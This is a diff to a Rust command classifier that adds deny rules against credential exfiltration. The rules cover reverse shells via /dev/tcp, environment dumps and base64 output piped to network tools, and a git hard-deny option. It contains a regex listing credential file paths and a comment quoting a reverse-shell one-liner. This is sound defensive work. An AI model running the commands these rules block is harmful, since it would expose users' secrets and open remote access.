@@ -17,9 +17,11 @@
 //!   `bash -c` / `sh -c` / `eval` / `sudo` / `find -exec` / `xargs` /
 //!   `timeout` / `nohup` / `env` / `nice` / `watch` / `su -c` / etc.
 //!   and re-classify through the whole stack.
-//!
-//! Remaining audit findings (M2) land on their own feature branch
-//! and plug into the same `Decision` switchboard.
+//! - **M2** — secret-path + network-tool composition (DNS exfil is a
+//!   special case), env-dump + network, base64+network, reverse-shell
+//!   patterns (`/dev/tcp/*`), plus the `git` split policy
+//!   (ask-by-default in secret-free contexts, hard-deny otherwise or
+//!   when `BARBICAN_GIT_HARD_DENY=1`).
 
 use std::io::{Read, Write};
 
@@ -27,7 +29,7 @@ use anyhow::{Context, Result};
 use serde::Deserialize;
 
 use crate::parser::{self, ParseError, Pipeline, RedirectFd, RedirectKind, Script};
-use crate::tables::SHELL_INTERPRETERS;
+use crate::tables::{ENV_DUMPERS, EXFIL_NETWORK_TOOLS, SHELL_INTERPRETERS};
 
 /// Maximum depth of M1 wrapper-unwrap recursion. Beyond this, a
 /// pathological nesting like `bash -c "bash -c 'bash -c ...'"`
@@ -162,6 +164,18 @@ fn classify_script_with_depth(script: &Script, depth: usize) -> Decision {
             return Decision::Deny { reason };
         }
         if let Some(reason) = h2_staged_decode_to_exec(pipeline) {
+            return Decision::Deny { reason };
+        }
+        if let Some(reason) = m2_reverse_shell(pipeline) {
+            return Decision::Deny { reason };
+        }
+        if let Some(reason) = m2_env_dump_to_network(pipeline) {
+            return Decision::Deny { reason };
+        }
+        if let Some(reason) = m2_secret_or_base64_to_network(pipeline) {
+            return Decision::Deny { reason };
+        }
+        if let Some(reason) = m2_git_hard_deny(pipeline) {
             return Decision::Deny { reason };
         }
         // M1: if any stage is a re-entry wrapper, unwrap it into a
@@ -857,6 +871,191 @@ static SHELL_RC_FILES: phf::Set<&'static str> = phf::phf_set! {
     ".bashrc", ".zshrc", ".profile", ".bash_profile", ".bash_login",
     ".zshenv", ".zprofile", ".zlogin",
 };
+
+// ---------------------------------------------------------------------
+// M2 — secret-exfil, env-dump-exfil, reverse-shell, git split.
+// ---------------------------------------------------------------------
+
+/// Secret-path regex: matches any argv token or raw command-substring
+/// that references a credential file. Case-insensitive.
+///
+/// Narthex parity (`SECRET_PATTERNS` in refs/narthex-071fec0/hooks/pre_bash.py).
+/// Deliberately broad — a credential path ANYWHERE in the command
+/// text plus a network tool is the shape we care about.
+///
+/// We compile once per process (the static regex is cheap and bounded).
+fn secret_path_regex() -> &'static regex::Regex {
+    static RE: std::sync::OnceLock<regex::Regex> = std::sync::OnceLock::new();
+    RE.get_or_init(|| {
+        regex::RegexBuilder::new(
+            r"(?x)
+              (?:^|[\s/'\x22=@])
+              (?:
+                  ~/\.ssh\b
+                | \$HOME/\.ssh\b
+                | \.ssh/(?:id_|authorized_keys|known_hosts)
+                | \bid_(?:rsa|ed25519|ecdsa|dsa)\b
+                | ~/\.aws\b
+                | \.aws/(?:credentials|config)\b
+                | ~/\.config/gh\b
+                | gh/hosts\.yml\b
+                | ~/\.netrc\b
+                | \.netrc\b
+                | \.env(?:\.[a-zA-Z0-9_-]+)?\b
+                | ~/\.docker/config\.json
+                | ~/\.kube/config\b
+                | ~/\.npmrc\b
+                | \.npmrc\b
+                | ~/\.pypirc\b
+                | ~/\.gnupg\b
+                | /etc/shadow\b
+                | ~/Library/Keychains\b
+                | \.pgpass\b
+              )",
+        )
+        .case_insensitive(true)
+        .build()
+        .expect("secret-path regex compiles")
+    })
+}
+
+/// True if the command-raw-text (or the argv0 text) in this pipeline's
+/// joined command looks like it references a credential file.
+fn pipeline_mentions_secret(pipeline: &Pipeline) -> bool {
+    let re = secret_path_regex();
+    for stage in &pipeline.stages {
+        if re.is_match(&stage.argv0_raw) {
+            return true;
+        }
+        for a in &stage.args {
+            if re.is_match(a) {
+                return true;
+            }
+        }
+        for r in &stage.redirects {
+            if re.is_match(&r.target) {
+                return true;
+            }
+        }
+    }
+    false
+}
+
+/// Basename of a stage, lowercased, for case-insensitive matching.
+fn stage_bn_lc(stage: &crate::parser::Command) -> String {
+    stage.basename.to_ascii_lowercase()
+}
+
+/// M2 reverse-shell pattern: any argv/redirect references `/dev/tcp/*`
+/// or `/dev/udp/*`. This covers `bash -i >& /dev/tcp/host/port` and
+/// `cat </dev/tcp/host/port`.
+fn m2_reverse_shell(pipeline: &Pipeline) -> Option<String> {
+    fn is_tcp_udp(s: &str) -> bool {
+        s.contains("/dev/tcp/") || s.contains("/dev/udp/")
+    }
+    for stage in &pipeline.stages {
+        if is_tcp_udp(&stage.argv0_raw) {
+            return Some(reverse_shell_reason(&stage.argv0_raw));
+        }
+        for a in &stage.args {
+            if is_tcp_udp(a) {
+                return Some(reverse_shell_reason(a));
+            }
+        }
+        for r in &stage.redirects {
+            if is_tcp_udp(&r.target) {
+                return Some(reverse_shell_reason(&r.target));
+            }
+        }
+    }
+    None
+}
+
+fn reverse_shell_reason(token: &str) -> String {
+    format!(
+        "blocked: reverse-shell pattern — `{t}` references /dev/tcp or \
+         /dev/udp (M2)",
+        t = sanitize_reason_text(token),
+    )
+}
+
+/// M2 env dump → network: pipeline contains an env-dumper in any stage
+/// and a network tool in any later stage.
+fn m2_env_dump_to_network(pipeline: &Pipeline) -> Option<String> {
+    let env_idx = pipeline
+        .stages
+        .iter()
+        .position(|s| ENV_DUMPERS.contains(stage_bn_lc(s).as_str()))?;
+    let net_stage = pipeline
+        .stages
+        .iter()
+        .skip(env_idx + 1)
+        .find(|s| EXFIL_NETWORK_TOOLS.contains(stage_bn_lc(s).as_str()))?;
+    Some(format!(
+        "blocked: environment dump (`{env}`) piped to network tool \
+         `{net}` (M2 — env-exfil)",
+        env = pipeline.stages[env_idx].basename,
+        net = net_stage.basename,
+    ))
+}
+
+/// M2 secret-exfil: pipeline either references a secret path anywhere
+/// AND contains a network tool, OR pipes `base64` of a secret to a
+/// network tool. `git` participates if a secret is present (the split
+/// policy — benign `git push` without a secret reference is allowed).
+fn m2_secret_or_base64_to_network(pipeline: &Pipeline) -> Option<String> {
+    let has_secret = pipeline_mentions_secret(pipeline);
+    let net_stage = pipeline
+        .stages
+        .iter()
+        .find(|s| {
+            let bn = stage_bn_lc(s);
+            EXFIL_NETWORK_TOOLS.contains(bn.as_str()) || (has_secret && bn == "git")
+        })
+        .cloned()?;
+    if has_secret {
+        return Some(format!(
+            "blocked: secret-path reference alongside network tool \
+             `{net}` (M2 — credential exfil)",
+            net = net_stage.basename,
+        ));
+    }
+    // Fallback: base64 encode piped into a network tool. Classic
+    // "obfuscate before upload" shape.
+    let base64_idx = pipeline
+        .stages
+        .iter()
+        .position(|s| stage_bn_lc(s).as_str() == "base64" && !is_decode_stage(s))?;
+    let net_stage = pipeline
+        .stages
+        .iter()
+        .skip(base64_idx + 1)
+        .find(|s| EXFIL_NETWORK_TOOLS.contains(stage_bn_lc(s).as_str()))?;
+    Some(format!(
+        "blocked: base64-encoded content piped to network tool \
+         `{net}` (M2 — obfuscated exfil)",
+        net = net_stage.basename,
+    ))
+}
+
+/// M2 `BARBICAN_GIT_HARD_DENY=1` promotes bare `git` to an
+/// unconditional deny. Without that env var, a bare `git push` with
+/// no secret reference is allowed; with it, even benign git is blocked
+/// so attackers can't quietly use it as the exfil channel.
+fn m2_git_hard_deny(pipeline: &Pipeline) -> Option<String> {
+    if std::env::var("BARBICAN_GIT_HARD_DENY").ok().as_deref() != Some("1") {
+        return None;
+    }
+    let git_stage = pipeline
+        .stages
+        .iter()
+        .find(|s| stage_bn_lc(s).as_str() == "git")?;
+    Some(format!(
+        "blocked: `{git}` invocation denied by BARBICAN_GIT_HARD_DENY=1 \
+         (M2 — git network-tool hard-deny)",
+        git = git_stage.basename,
+    ))
+}
 
 /// Filename extensions associated with executable content (matched
 /// case-insensitively).
